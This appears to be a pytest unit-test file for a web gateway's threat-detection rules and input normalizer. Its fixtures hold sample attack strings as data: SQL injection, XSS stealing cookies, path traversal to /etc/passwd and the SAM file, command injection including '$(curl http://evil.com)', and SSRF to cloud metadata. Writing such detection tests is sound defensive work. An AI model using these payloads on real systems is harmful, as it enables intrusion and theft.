"""
SentinelGate — Phase 4 Threat Detection Unit Tests
==================================================
Lean, targeted tests covering:
- Normalization pipeline & evasion defenses (double-decode, HTML entities, Unicode NFC, null bytes)
- Individual rule verification: happy path, main blocking condition, and evasion/edge cases
- Engine orchestration and allowlist bypass
"""
from __future__ import annotations

import pytest

from backend.config import get_settings
from backend.schemas.context import GatewayContext
from backend.threat_detection.engine import ThreatDetectionEngine, threat_detection_check
from backend.threat_detection.normalizer import extract_inspection_targets, normalize_text
from backend.threat_detection.rules import (
    CommandInjectionRule,
    MethodAbuseRule,
    PathTraversalRule,
    SQLInjectionRule,
    SSRFRule,
    UserAgentRule,
    XSSRule,
)


class TestEvasionNormalizer:
    """Tests for normalizer pipeline (loopholes 6 and 7)."""

    def test_happy_path_clean_string(self) -> None:
        raw = "Hello World! Standard-Input 123"
        normalized = normalize_text(raw)
        assert normalized == "hello world! standard-input 123"

    def test_double_encoding_and_null_bytes(self) -> None:
        # Loophole 6: Double-encoded %252e%252e -> %2e%2e -> ..
        raw = "%252e%252e%252fetc%252fpasswd%00.png"
        normalized = normalize_text(raw)
        assert "../etc/passwd.png" in normalized
        assert "%00" not in normalized
        assert "\x00" not in normalized

    def test_html_entities_and_unicode_normalization(self) -> None:
        # Loophole 7: HTML entities and Unicode forms
        raw = "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;"
        normalized = normalize_text(raw)
        assert "<script>alert('xss')</script>" in normalized


class TestSQLInjectionRule:
    """Targeted SQL Injection tests."""

    @pytest.fixture
    def rule(self) -> SQLInjectionRule:
        return SQLInjectionRule()

    def test_sqli_happy_path(self, rule: SQLInjectionRule) -> None:
        # Benign phrases with SQL-like words or apostrophes must NOT trigger
        ctx = GatewayContext(client_ip="1.2.3.4", method="GET", path="/api/items")
        for safe_val in ["select few items", "drop shipment", "john o'brien", "hello world"]:
            targets = extract_inspection_targets(
                GatewayContext(
                    client_ip="1.2.3.4",
                    method="GET",
                    path="/api/items",
                    query_params={"q": safe_val},
                )
            )
            matches = rule.inspect(ctx, targets)
            assert len(matches) == 0, f"False positive triggered on safe string: '{safe_val}'"

    def test_sqli_blocking_condition(self, rule: SQLInjectionRule) -> None:
        # Classic SQLi payloads must be flagged
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="POST",
            path="/api/login",
            query_params={"q": "' OR 1=1 --"},
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) > 0
        assert matches[0].category == "SQL_INJECTION"
        assert matches[0].severity == "HIGH"
        assert matches[0].risk_delta == 60

    def test_sqli_evasion_edge_case(self, rule: SQLInjectionRule) -> None:
        # Double URL-encoded UNION SELECT in body
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="POST",
            path="/api/search",
            body=b'{"query": "UNION%2520ALL%2520SELECT%25201,2,3"}',
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) > 0
        assert matches[0].category == "SQL_INJECTION"


class TestXSSRule:
    """Targeted XSS tests."""

    @pytest.fixture
    def rule(self) -> XSSRule:
        return XSSRule()

    def test_xss_happy_path(self, rule: XSSRule) -> None:
        # Safe text with mathematical or punctuation symbols
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="GET",
            path="/api/search",
            query_params={"desc": "I love <3 pizza and price is $4.99 & fast!"},
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) == 0

    def test_xss_blocking_condition(self, rule: XSSRule) -> None:
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="POST",
            path="/api/comments",
            body=b'{"comment": "<img src=x onerror=alert(1)>"}',
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) > 0
        assert matches[0].category == "XSS"
        assert matches[0].severity == "HIGH"

    def test_xss_evasion_edge_case(self, rule: XSSRule) -> None:
        # HTML entity encoded javascript URI
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="GET",
            path="/api/profile",
            query_params={"link": "&lt;script&gt;alert(document.cookie)&lt;/script&gt;"},
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) > 0
        assert matches[0].category == "XSS"


class TestPathTraversalRule:
    """Targeted Path Traversal tests."""

    @pytest.fixture
    def rule(self) -> PathTraversalRule:
        return PathTraversalRule()

    def test_path_traversal_happy_path(self, rule: PathTraversalRule) -> None:
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="GET",
            path="/api/users/profile",
            query_params={"file": "report_2026.pdf"},
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) == 0

    def test_path_traversal_blocking_condition(self, rule: PathTraversalRule) -> None:
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="GET",
            path="/api/download",
            query_params={"file": "../../etc/passwd"},
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) > 0
        assert matches[0].category == "PATH_TRAVERSAL"
        assert matches[0].risk_delta == 55

    def test_path_traversal_edge_case(self, rule: PathTraversalRule) -> None:
        # Windows system32 and double encoded traversal
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="GET",
            path="/api/download",
            query_params={"file": "..%255c..%255cwindows%255csystem32%255cconfig%255csam"},
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) > 0
        assert matches[0].category == "PATH_TRAVERSAL"


class TestCommandInjectionRule:
    """Targeted Command Injection tests."""

    @pytest.fixture
    def rule(self) -> CommandInjectionRule:
        return CommandInjectionRule()

    def test_cmd_injection_happy_path(self, rule: CommandInjectionRule) -> None:
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="GET",
            path="/api/items",
            query_params={"q": "ping time 300ms | use | as separator in CSV"},
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) == 0

    def test_cmd_injection_blocking_condition(self, rule: CommandInjectionRule) -> None:
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="POST",
            path="/api/run",
            body=b'{"host": "127.0.0.1; whoami"}',
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) > 0
        assert matches[0].category == "COMMAND_INJECTION"
        assert matches[0].severity == "CRITICAL"
        assert matches[0].risk_delta == 70

    def test_cmd_injection_edge_case(self, rule: CommandInjectionRule) -> None:
        # Subshell execution
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="GET",
            path="/api/test",
            query_params={"arg": "$(curl http://evil.com)"},
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) > 0
        assert matches[0].category == "COMMAND_INJECTION"


class TestSSRFRule:
    """Targeted SSRF tests (loophole 8)."""

    @pytest.fixture
    def rule(self) -> SSRFRule:
        return SSRFRule()

    def test_ssrf_happy_path(self, rule: SSRFRule) -> None:
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="GET",
            path="/api/fetch",
            query_params={"url": "https://api.github.com/repos"},
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) == 0

    def test_ssrf_blocking_condition(self, rule: SSRFRule) -> None:
        # Cloud metadata service AWS IP
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="POST",
            path="/api/webhook",
            body=b'{"url": "http://169.254.169.254/latest/meta-data/"}',
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) > 0
        assert matches[0].category == "SSRF"
        assert matches[0].severity == "HIGH"

    def test_ssrf_edge_case(self, rule: SSRFRule) -> None:
        # file:// scheme
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="GET",
            path="/api/load",
            query_params={"target": "file:///etc/passwd"},
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) > 0
        assert matches[0].category == "SSRF"


class TestUserAgentRule:
    """Targeted User-Agent tests (loophole 10)."""

    @pytest.fixture
    def rule(self) -> UserAgentRule:
        return UserAgentRule()

    def test_ua_happy_path(self, rule: UserAgentRule) -> None:
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="GET",
            path="/api/items",
            headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) == 0

    def test_ua_scanner_flagged_not_blocked(self, rule: UserAgentRule) -> None:
        # Scanner detected: adds risk without blocking directly
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="GET",
            path="/api/items",
            headers={"user-agent": "sqlmap/1.6#stable"},
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) > 0
        assert matches[0].category == "SUSPICIOUS_UA"
        assert matches[0].risk_delta == 25
        assert rule.blocks_directly is False

    def test_ua_missing_or_empty(self, rule: UserAgentRule) -> None:
        ctx = GatewayContext(
            client_ip="1.2.3.4",
            method="GET",
            path="/api/items",
            headers={},
        )
        targets = extract_inspection_targets(ctx)
        matches = rule.inspect(ctx, targets)
        assert len(matches) > 0
        assert matches[0].category == "SUSPICIOUS_UA"
        assert matches[0].risk_delta == 15


class TestMethodAbuseRule:
    """Targeted HTTP Method Abuse tests (loophole 9)."""

    @pytest.fixture
    def rule(self) -> MethodAbuseRule:
        return MethodAbuseRule()

    def test_method_happy_path(self, rule: MethodAbuseRule) -> None:
        ctx = GatewayContext(client_ip="1.2.3.4", method="POST", path="/auth/login")
        matches = rule.inspect(ctx, [])
        assert len(matches) == 0

    def test_method_endpoint_mismatch_blocks_with_405(self, rule: MethodAbuseRule) -> None:
        ctx = GatewayContext(client_ip="1.2.3.4", method="GET", path="/auth/login")
        matches = rule.inspect(ctx, [])
        assert len(matches) > 0
        assert matches[0].category == "METHOD_ABUSE"
        assert rule.status_code == 405

    def test_method_dangerous_universal_block(self, rule: MethodAbuseRule) -> None:
        ctx = GatewayContext(client_ip="1.2.3.4", method="TRACE", path="/api/items")
        matches = rule.inspect(ctx, [])
        assert len(matches) > 0
        assert matches[0].category == "METHOD_ABUSE"
        assert rule.status_code == 405


class TestThreatDetectionEngine:
    """Tests for ThreatDetectionEngine orchestration and pipeline check."""

    @pytest.mark.asyncio
    async def test_clean_request_passes_pipeline_check(self) -> None:
        ctx = GatewayContext(
            client_ip="192.168.1.50",
            method="GET",
            path="/api/products",
            headers={"user-agent": "Mozilla/5.0"},
        )
        result = await threat_detection_check(ctx)
        assert result.passed is True
        assert result.risk_delta == 0
        assert result.threat is None

    @pytest.mark.asyncio
    async def test_threat_blocks_request_with_correct_code(self) -> None:
        # SQL Injection attack
        ctx = GatewayContext(
            client_ip="192.168.1.50",
            method="GET",
            path="/api/products",
            query_params={"filter": "1; DROP TABLE users; --"},
            headers={"user-agent": "Mozilla/5.0"},
        )
        result = await threat_detection_check(ctx)
        assert result.passed is False
        assert result.status_code == 403
        assert result.threat is not None
        assert result.threat.category == "SQL_INJECTION"
        assert result.risk_delta >= 60

    @pytest.mark.asyncio
    async def test_allowlist_bypasses_inspection(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Configure allowlist for IP
        settings = get_settings()
        monkeypatch.setattr(settings, "waf_allowlist_ips", ["10.0.0.99"])

        ctx = GatewayContext(
            client_ip="10.0.0.99",
            method="GET",
            path="/api/test",
            query_params={"q": "' OR 1=1 --"},
        )
        engine = ThreatDetectionEngine()
        matches = engine.inspect(ctx)
        assert len(matches) == 0, "Allowlisted IP must bypass threat detection"
